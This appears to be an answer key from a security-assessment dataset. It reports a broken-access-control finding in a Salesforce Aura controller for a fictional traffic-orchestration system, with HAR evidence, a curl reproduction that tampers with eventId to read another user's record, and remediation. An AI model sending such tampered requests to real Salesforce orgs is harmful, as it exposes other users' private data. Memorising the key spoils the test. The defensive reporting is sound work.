# Expected Response

## System
- **Domain:** Smart City / Traffic Orchestration (Salesforce-Integrated)
- **System:** MetroPulse Traffic Orchestration (Salesforce-Integrated)
- **Example ID:** SF-0004

## Priority Findings

### Finding 1: Smart City Salesforce — BAC Privilege Escalation via Aura updateEvent Exposes Cross-Ownership Event Records (Pattern 2.4)
**Severity:** High
**Category:** Broken Access Control / Privilege Escalation via Parameter Tampering

**Summary:**
Per §4.0 (RISK-SF-004/RISK-SF-005): The `EventController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 2.4 — privilege escalation via parameter tampering): an attacker can escalate their privileges horizontally by tampering with the `eventId` parameter in the Aura action, accessing traffic event records owned by other users. An attacker submitted `c.EventController.updateEvent` with `eventId: "001A296"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-87-4441"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Smart City / Traffic Orchestration, unauthorized access to traffic event records enables infrastructure manipulation.

**Evidence from HAR:**
- Request: `POST https://0eeba296.lightning.force.com/aura`
- Aura action descriptor: `c.EventController.updateEvent`
- `aura.token`: `undefined`
- Params: `eventId: "001A296"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "001A296"`, `Name: "Victim Event Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-87-4441"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-004 | EventController declared `without sharing` |
| context.txt §4.0 | RISK-SF-005 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 2.4 | Privilege escalation via eventId parameter tampering |
| HAR request | params.eventId | 001A296 — victim traffic event ID |
| HAR response | SensitiveData__c | SSN: 000-87-4441 (PII) |
| HAR response | OwnerId | 005VICTIM (privilege escalation confirmed) |

## Steps to Reproduce

### Step 1 — Aura eventId parameter tampering privilege escalation (HAR)
```bash
curl -s -X POST 'https://0eeba296.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"001A296","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim traffic event record including `SSN: 000-87-4441`. **Secure:** FORBIDDEN — `with sharing` enforced; SOQL restricted to caller ownership.

## Remediation
1. Declare `EventController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to the SOQL WHERE clause.
3. Validate `aura.token` before processing any Aura mutation.
4. Strip `SensitiveData__c` and `InternalNotes__c` from default event response.
